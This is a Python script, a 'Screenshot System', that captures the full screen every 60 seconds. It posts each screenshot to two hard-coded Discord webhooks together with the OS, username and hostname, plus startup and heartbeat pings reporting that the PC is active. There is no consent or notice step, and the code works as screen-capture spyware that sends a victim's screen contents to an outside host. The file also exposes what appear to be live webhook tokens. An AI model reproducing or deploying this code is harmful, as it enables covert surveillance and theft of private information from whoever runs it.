import time
import threading
import requests
import io
import psutil
import os
from datetime import datetime
from PIL import ImageGrab
import json

# ---------------- CONFIG ---------------- #
# Discord Webhook Configuration (BOTH WEBHOOKS)
DISCORD_WEBHOOKS = [
    "https://discordapp.com/api/webhooks/1464318526650187836/JVj45KwndFltWM8WZeD3z9e0dlIipcbyQN7Fu_iAt5HpBn1O5f4t_r43koMeX3Dv73gF",
    "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
]
SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
PERIODIC_SCREENSHOT_INTERVAL = 60  # Take screenshot every 45 seconds
HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
CPU_MONITOR_INTERVAL = 60  # Check CPU usage every 60 seconds

# ---------------- GLOBALS ---------------- #
program_start_time = time.time()  # Track program start time
last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
stop_event = threading.Event()  # Event to signal threads to stop
process = psutil.Process(os.getpid())  # Get current process for CPU monitoring

def get_cpu_usage():
    """Get current CPU usage percentage for this process"""
    try:
        # Get CPU usage as a percentage
        cpu_percent = process.cpu_percent(interval=0.1)
        memory_info = process.memory_info()
        memory_mb = memory_info.rss / (1024 * 1024)  # Convert to MB
        
        return {
            "cpu_percent": round(cpu_percent, 2),
            "memory_mb": round(memory_mb, 2),
            "threads": process.num_threads()
        }
    except Exception as e:
        print(f"[CPU MONITOR ERROR] {e}")
        return {"cpu_percent": 0, "memory_mb": 0, "threads": 0}

def take_screenshot():
    """Take a screenshot of the entire screen"""
    try:
        screenshot = ImageGrab.grab()
        return screenshot
    except Exception as e:
        print(f"[SCREENSHOT ERROR] {e}")
        return None

def send_to_webhook(webhook_url, payload, screenshot_bytes=None):
    """Send data to a specific webhook URL"""
    try:
        if screenshot_bytes:
            # Create a new BytesIO object for each webhook
            img_byte_arr = io.BytesIO(screenshot_bytes)
            files = {
                'file': ('screenshot.png', img_byte_arr, 'image/png')
            }
            
            # Prepare multipart form data
            if 'embeds' in payload:
                data = {'payload_json': json.dumps(payload)}
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=data,
                    timeout=10
                )
            else:
                # If no embeds, just send with files
                response = requests.post(
                    webhook_url,
                    files=files,
                    data=payload,
                    timeout=10
                )
        else:
            headers = {'Content-Type': 'application/json'}
            response = requests.post(
                webhook_url,
                json=payload,
                headers=headers,
                timeout=10
            )
        
        if response.status_code in [200, 204]:
            print(f"[WEBHOOK SUCCESS] Sent to {webhook_url[:40]}...")
            return True
        else:
            print(f"[WEBHOOK ERROR] Failed to send to {webhook_url[:40]}...: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"[WEBHOOK ERROR] {e} for {webhook_url[:40]}...")
        return False

def send_to_all_webhooks(payload, screenshot=None):
    """Send message to all configured webhooks"""
    if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
        print("[DISCORD] No webhooks configured")
        return False
    
    success_count = 0
    threads = []
    
    # Convert screenshot to bytes once
    screenshot_bytes = None
    if screenshot and SEND_SCREENSHOTS:
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
        
        # Add screenshot info to payload
        if 'embeds' in payload:
            if 'content' not in payload or not payload['content']:
                payload['content'] = "📸 **Screenshot captured below:**"
    
    for webhook_url in DISCORD_WEBHOOKS:
        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
            continue
            
        # Create thread for each webhook
        if screenshot_bytes:
            thread = threading.Thread(
                target=send_to_webhook,
                args=(webhook_url, payload),
                kwargs={'screenshot_bytes': screenshot_bytes}
            )
        else:
            thread = threading.Thread(
                target=send_to_webhook,
                args=(webhook_url, payload)
            )
        
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join(timeout=15)  # 15 second timeout per webhook
        
        # Check if thread completed successfully
        if not thread.is_alive():
            success_count += 1
    
    print(f"[DISCORD] Sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
    return success_count > 0

def send_heartbeat():
    """Send heartbeat webhook to confirm PC is active"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        uptime_seconds = int(time.time() - program_start_time)
        
        # Convert uptime to readable format
        hours = uptime_seconds // 3600
        minutes = (uptime_seconds % 3600) // 60
        seconds = uptime_seconds % 60
        
        # Get CPU usage
        cpu_info = get_cpu_usage()
        
        embed = {
            "title": "💓 PC Heartbeat",
            "description": f"**PC is active and running**\n**Time:** `{current_time}`\n**Uptime:** `{hours}h {minutes}m {seconds}s`\n**CPU Usage:** `{cpu_info['cpu_percent']}%`\n**Memory:** `{cpu_info['memory_mb']} MB`",
            "color": 3447003,  # Blue color
            "footer": {
                "text": "Screenshot System"
            }
        }
        
        payload = {
            "embeds": [embed]
        }
        
        success = send_to_all_webhooks(payload)
        if success:
            print(f"[HEARTBEAT] Sent to all webhooks at {current_time}")
        return success
            
    except Exception as e:
        print(f"[HEARTBEAT ERROR] {e}")
        return False

def send_periodic_screenshot():
    """Send periodic screenshot to Discord"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Take screenshot
        screenshot = take_screenshot() if SEND_SCREENSHOTS else None
        
        # Get CPU usage
        cpu_info = get_cpu_usage()
        
        # Get some basic system info (optional)
        try:
            import platform
            import getpass
            system_info = f"**System:** {platform.system()} {platform.release()}\n**User:** {getpass.getuser()}"
        except:
            system_info = "**System:** Unknown"
        
        # Prepare message
        embed = {
            "title": "⏰ Periodic Screenshot",
            "description": f"**Time:** `{current_time}`\n**Interval:** `{PERIODIC_SCREENSHOT_INTERVAL} seconds`\n**CPU Usage:** `{cpu_info['cpu_percent']}%`\n**Memory:** `{cpu_info['memory_mb']} MB`\n{system_info}",
            "color": 10181046,  # Purple color
            "footer": {
                "text": f"Screenshot System - Captured every {PERIODIC_SCREENSHOT_INTERVAL} seconds"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": f"📸 **Automatic screenshot captured** (Interval: {PERIODIC_SCREENSHOT_INTERVAL}s)"
        }
        
        success = send_to_all_webhooks(payload, screenshot)
        if success:
            print(f"[PERIODIC] Sent periodic screenshot at {current_time} | CPU: {cpu_info['cpu_percent']}% | Mem: {cpu_info['memory_mb']}MB")
        return success
            
    except Exception as e:
        print(f"[PERIODIC ERROR] {e}")
        return False

def send_startup_message():
    """Send webhook when the program starts"""
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Get system info
        try:
            import platform
            import getpass
            import socket
            system_info = f"**System:** {platform.system()} {platform.release()}\n**User:** {getpass.getuser()}\n**Host:** {socket.gethostname()}"
        except:
            system_info = "**System:** Unknown"
        
        # Get initial CPU usage
        cpu_info = get_cpu_usage()
        
        embed = {
            "title": "🚀 Screenshot System Started",
            "description": f"**Screenshot system has been launched**\n**Start Time:** `{current_time}`\n**Screenshot Interval:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds`\n**Initial CPU Usage:** `{cpu_info['cpu_percent']}%`\n**Initial Memory:** `{cpu_info['memory_mb']} MB`\n{system_info}",
            "color": 3066993,  # Green color
            "footer": {
                "text": "Screenshot System"
            }
        }
        
        payload = {
            "embeds": [embed],
            "content": "📱 **Screenshot System Online** - Now taking periodic screenshots"
        }
        
        success = send_to_all_webhooks(payload)
        if success:
            print(f"[STARTUP] Message sent to all webhooks at {current_time}")
        return success
            
    except Exception as e:
        print(f"[STARTUP ERROR] {e}")
        return False

# ---------------- HEARTBEAT THREAD ---------------- #
def heartbeat_monitor():
    """Periodically send heartbeat every 5 minutes"""
    last_heartbeat_time = time.time()
    
    while not stop_event.is_set():
        try:
            current_time = time.time()
            
            # Check if it's time to send heartbeat
            if current_time - last_heartbeat_time >= HEARTBEAT_INTERVAL:
                threading.Thread(target=send_heartbeat, daemon=True).start()
                last_heartbeat_time = current_time
            
            # Sleep for 10 seconds and check again (more efficient than 60 seconds)
            time.sleep(10)
            
        except Exception as e:
            print(f"[HEARTBEAT MONITOR ERROR] {e}")
            time.sleep(10)

# ---------------- PERIODIC SCREENSHOT THREAD ---------------- #
def periodic_screenshot_monitor():
    """Periodically take screenshots at configured interval"""
    last_periodic_screenshot_time = time.time()
    
    while not stop_event.is_set():
        try:
            current_time = time.time()
            
            # Check if it's time to take periodic screenshot
            if (current_time - last_periodic_screenshot_time >= PERIODIC_SCREENSHOT_INTERVAL and 
                SEND_SCREENSHOTS):
                
                threading.Thread(target=send_periodic_screenshot, daemon=True).start()
                last_periodic_screenshot_time = current_time
                print(f"[PERIODIC] Next screenshot in {PERIODIC_SCREENSHOT_INTERVAL} seconds")
            
            # Sleep for 1 second and check again
            time.sleep(1)
            
        except Exception as e:
            print(f"[PERIODIC MONITOR ERROR] {e}")
            time.sleep(1)

# ---------------- CPU MONITOR THREAD ---------------- #
def cpu_monitor():
    """Monitor and log CPU usage periodically"""
    last_cpu_check_time = time.time()
    
    while not stop_event.is_set():
        try:
            current_time = time.time()
            
            # Check CPU usage every CPU_MONITOR_INTERVAL seconds
            if current_time - last_cpu_check_time >= CPU_MONITOR_INTERVAL:
                cpu_info = get_cpu_usage()
                print(f"[CPU MONITOR] CPU: {cpu_info['cpu_percent']}% | Memory: {cpu_info['memory_mb']}MB | Threads: {cpu_info['threads']}")
                last_cpu_check_time = current_time
            
            # Sleep for 5 seconds
            time.sleep(5)
            
        except Exception as e:
            print(f"[CPU MONITOR ERROR] {e}")
            time.sleep(5)

# ---------------- MAIN PROGRAM ---------------- #
def main():
    global stop_event
    
    print("[SYSTEM] Screenshot system started...")
    print(f"[SYSTEM] Periodic screenshots: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds")
    print(f"[SYSTEM] Heartbeat interval: Every {HEARTBEAT_INTERVAL//60} minutes")
    print(f"[SYSTEM] CPU monitor interval: Every {CPU_MONITOR_INTERVAL} seconds")
    
    # Check if psutil is available
    try:
        import psutil
    except ImportError:
        print("[WARNING] psutil not installed. Installing...")
        try:
            import subprocess
            subprocess.check_call(["pip", "install", "psutil"])
            import psutil
            global process
            process = psutil.Process(os.getpid())
            print("[SYSTEM] psutil installed successfully")
        except:
            print("[ERROR] Failed to install psutil. CPU monitoring disabled.")
    
    # Send startup webhook immediately
    if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
        print(f"[STARTUP] Sending startup webhook to {len(DISCORD_WEBHOOKS)} webhooks...")
        threading.Thread(target=send_startup_message, daemon=True).start()
        
        # Start heartbeat monitor in a separate thread
        heartbeat_thread = threading.Thread(target=heartbeat_monitor, daemon=True)
        heartbeat_thread.start()
        print(f"[HEARTBEAT] Heartbeat monitor started (every {HEARTBEAT_INTERVAL//60} minutes)")
        
        # Start periodic screenshot monitor in a separate thread
        periodic_thread = threading.Thread(target=periodic_screenshot_monitor, daemon=True)
        periodic_thread.start()
        print(f"[PERIODIC] Periodic screenshot monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
        
        # Start CPU monitor thread
        cpu_thread = threading.Thread(target=cpu_monitor, daemon=True)
        cpu_thread.start()
        print(f"[CPU MONITOR] CPU monitor started (every {CPU_MONITOR_INTERVAL} seconds)")
    else:
        print("[DISCORD] No webhooks configured - skipping startup and heartbeat messages")
    
    # Test Discord connections
    valid_webhooks = []
    for i, webhook_url in enumerate(DISCORD_WEBHOOKS, 1):
        if webhook_url and webhook_url != "YOUR_DISCORD_WEBHOOK_URL_HERE":
            print(f"[DISCORD] Webhook {i} configured")
            try:
                # Just check if URL looks valid
                if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
                    print(f"[DISCORD] Webhook {i} URL format is valid")
                    valid_webhooks.append(webhook_url)
                else:
                    print(f"[DISCORD WARNING] Webhook {i} has unusual format")
                    valid_webhooks.append(webhook_url)
            except:
                print(f"[DISCORD] Could not test webhook {i} (will still try to post)")
                valid_webhooks.append(webhook_url)
    
    if valid_webhooks:
        print(f"[DISCORD] {len(valid_webhooks)}/{len(DISCORD_WEBHOOKS)} webhooks are valid - Screenshots: {SEND_SCREENSHOTS}")
    else:
        print("[DISCORD] No valid webhooks configured - screenshots will not be sent")
    
    # Keep the main thread alive using efficient waiting
    try:
        print("\n[SYSTEM] System running. Press Ctrl+C to stop.")
        print("[SYSTEM] Current resource usage will be displayed periodically.")
        
        # Initial CPU usage display
        cpu_info = get_cpu_usage()
        print(f"[SYSTEM] Initial CPU: {cpu_info['cpu_percent']}% | Memory: {cpu_info['memory_mb']}MB")
        
        # Use a more efficient wait loop
        while not stop_event.is_set():
            # Instead of busy-waiting, use a longer sleep
            time.sleep(60)  # Check every minute if we should stop
            
            # Optional: Display periodic status
            cpu_info = get_cpu_usage()
            print(f"[SYSTEM STATUS] CPU: {cpu_info['cpu_percent']}% | Memory: {cpu_info['memory_mb']}MB | Running for {int(time.time() - program_start_time)}s")
            
    except KeyboardInterrupt:
        print("\n[EXIT] Stopping screenshot system...")
        stop_event.set()
        
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        stop_event.set()
    
    finally:
        # Give threads time to finish
        print("[SYSTEM] Waiting for threads to finish...")
        time.sleep(2)
        
        # Calculate statistics
        run_time = int(time.time() - program_start_time)
        screenshots_taken = int(run_time / PERIODIC_SCREENSHOT_INTERVAL) if PERIODIC_SCREENSHOT_INTERVAL > 0 else 0
        
        print(f"[STATS] System ran for {run_time} seconds")
        print(f"[STATS] Approximately {screenshots_taken} screenshots taken")
        print("[SYSTEM] Screenshot system shutdown complete")

if __name__ == "__main__":
    main()
